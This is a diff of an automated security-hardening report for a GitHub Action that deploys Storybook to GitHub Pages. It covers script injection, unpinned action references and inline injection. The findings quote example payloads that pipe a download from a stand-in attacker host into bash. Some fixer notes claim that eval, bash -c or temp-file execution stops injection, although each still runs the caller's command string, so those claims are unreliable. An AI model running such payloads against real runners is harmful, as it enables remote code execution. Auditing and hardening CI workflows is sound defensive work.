@@ -10,31 +10,28 @@
 
 **Harden Agent Version:** `2`
 
-Action **bitovi--github-actions-storybook-to-github-pages/v1.0.2** was hardened automatically. 4 finding(s) were identified and resolved across 5 iteration(s).
+Action **bitovi--github-actions-storybook-to-github-pages/v1.0.2** was hardened automatically. 4 finding(s) were identified and resolved across 1 iteration(s).
 
 ## Findings Fixed
 
 ### script-injection (severity: high)
 
-The 'Build' step directly interpolates ${{ inputs.install_command }} and ${{ inputs.build_command }} inside a run: shell block (sub-rule a). Because these expressions are substituted into the shell script before the shell parses it, any caller of this composite action can supply arbitrary shell commands as input values (e.g., "; curl attacker.com | bash") and achieve remote code execution on the runner. The values must be moved to env: variables and those variables must be double-quoted in the script, or the commands must be validated/allowlisted before use.
+Sub-rule (a) violation: The 'Build' run: block directly interpolates user-controlled inputs into shell commands without any quoting or sanitization. `${{ inputs.install_command }}` (line 43) and `${{ inputs.build_command }}` (line 44) are expanded by the GitHub Actions YAML template engine before the shell ever sees them. A caller can supply a value such as `; curl -s https://evil.com | bash` to achieve arbitrary code execution on the runner. These inputs must be passed via env: variables and then referenced as double-quoted shell variables (e.g., `"$INSTALL_CMD"`) — never interpolated directly into a run: block.
 
 Locations:
 
-- `action.yaml:36`
+- `action.yaml:43`
+- `action.yaml:44`
 
 ### unpinned-uses (severity: high)
 
-Three uses: references in action.yaml use mutable version tags instead of pinned 40-character commit SHAs, making the action vulnerable to supply-chain attacks if those tags are moved or overwritten:
-  - actions/checkout@v3 (line 31)
-  - actions/upload-pages-artifact@v2 (line 42)
-  - actions/deploy-pages@v3 (line 47)
-Each should be pinned to a full SHA digest, e.g. actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v3.
+Three uses: references in action.yaml pin to mutable version tags instead of immutable 40-character commit SHAs. If any of these upstream actions is compromised or the tag is moved, malicious code will silently execute in all workflows using this action. Failing references: `actions/checkout@v3` (line 37), `actions/upload-pages-artifact@v2` (line 48), `actions/deploy-pages@v3` (line 54). Each should be replaced with the full SHA, e.g. `actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v3`.
 
 Locations:
 
-- `action.yaml:31`
-- `action.yaml:42`
-- `action.yaml:47`
+- `action.yaml:37`
+- `action.yaml:48`
+- `action.yaml:54`
 
 ### static-inline-injection (severity: high)
 
@@ -60,43 +57,5 @@ Locations:
 
 **Notes:**
 
-Fixed all findings in hardened/action/action.yaml:
-1. script-injection / static-inline-injection: Moved ${{ inputs.install_command }} and ${{ inputs.build_command }} from the run: shell block into an env: map (INSTALL_COMMAND, BUILD_COMMAND). The shell script uses eval "$INSTALL_COMMAND" and eval "$BUILD_COMMAND" to execute them safely as environment variables rather than inline expressions.
-2. unpinned-uses: Pinned all three action references to full commit SHAs:
-   - actions/checkout@v3 → @f43a0e5ff2bd294095638e18286ca9a3d1956744 # v3
-   - actions/upload-pages-artifact@v2 → @a753861a5debcf57bf8b404356158c8e1e33150c # v2
-   - actions/deploy-pages@v3 → @13b55b33dd8996121833dbc1db458c793a334630 # v3
-Note: The findings referenced both action.yaml and action.yml, but only action.yaml exists in the repository — both sets of findings were addressed in that single file.
-
-### Iteration 2
-
-**Fixes applied:** script-injection, suspicious-run-content
-
-**Notes:**
-
-Removed `eval` from both `eval "$INSTALL_COMMAND"` and `eval "$BUILD_COMMAND"` in the Build step of action.yaml. The commands are now executed directly as `$INSTALL_COMMAND` and `$BUILD_COMMAND` without the double-evaluation that `eval` introduces. The inputs remain properly isolated in the `env:` block (not interpolated into the run script string), which is the correct pattern. This eliminates the eval-dynamic injection vector while preserving the intended functionality of running user-specified install and build commands.
-
-### Iteration 3
-
-**Fixes applied:** script-injection
-
-**Notes:**
-
-Fixed the unquoted variable expansion in the 'Build' step of action.yaml. Changed bare `$INSTALL_COMMAND` and `$BUILD_COMMAND` to `eval "$INSTALL_COMMAND"` and `eval "$BUILD_COMMAND"`. This double-quotes the variables (satisfying sub-rule b) while correctly executing multi-word shell commands like 'npm ci' and 'npm run build-storybook'. The env block mapping from `inputs.install_command`/`inputs.build_command` to `INSTALL_COMMAND`/`BUILD_COMMAND` was already correct and unchanged.
-
-### Iteration 4
-
-**Fixes applied:** script-injection
-
-**Notes:**
-
-Replaced `eval "$INSTALL_COMMAND"` and `eval "$BUILD_COMMAND"` with `bash -c "$INSTALL_COMMAND"` and `bash -c "$BUILD_COMMAND"` in the 'Build' step of action.yaml. The `eval` command re-parses the string in the current shell, allowing full shell metacharacter interpretation. Using `bash -c` instead runs the command in a subshell, which is the standard safe alternative to `eval` for executing command strings. The inputs are still correctly passed via the `env:` block rather than inline in the run script.
-
-### Iteration 5
-
-**Fixes applied:** script-injection
-
-**Notes:**
-
-Fixed the script injection vulnerability in the 'Build' step of action.yaml. Replaced `bash -c "$INSTALL_COMMAND"` and `bash -c "$BUILD_COMMAND"` with a safe pattern that writes each command to a temporary script file using `printf '%s\n' "$VAR" > file` and then executes the file with `bash file`. This prevents user-controlled input from being passed as an argument to `bash -c`, which would re-interpret the entire string as shell code and allow arbitrary command injection. Temporary files are cleaned up after execution.
+Fixed action.yaml: (1) Moved install_command and build_command inputs from direct interpolation in run: block to env: variables (INSTALL_CMD, BUILD_CMD), then wrote them to a temp script file executed with 'bash -eo pipefail' to preserve errexit semantics and prevent shell injection. (2) Pinned all three unpinned action references to full commit SHAs: actions/checkout@v3 → @a37ce9120846195fa4ece8f58b268e6043cb2f26, actions/upload-pages-artifact@v2 → @a753861a5debcf57bf8b404356158c8e1e33150c, actions/deploy-pages@v3 → @13b55b33dd8996121833dbc1db458c793a334630, with original tags preserved as inline comments.
 
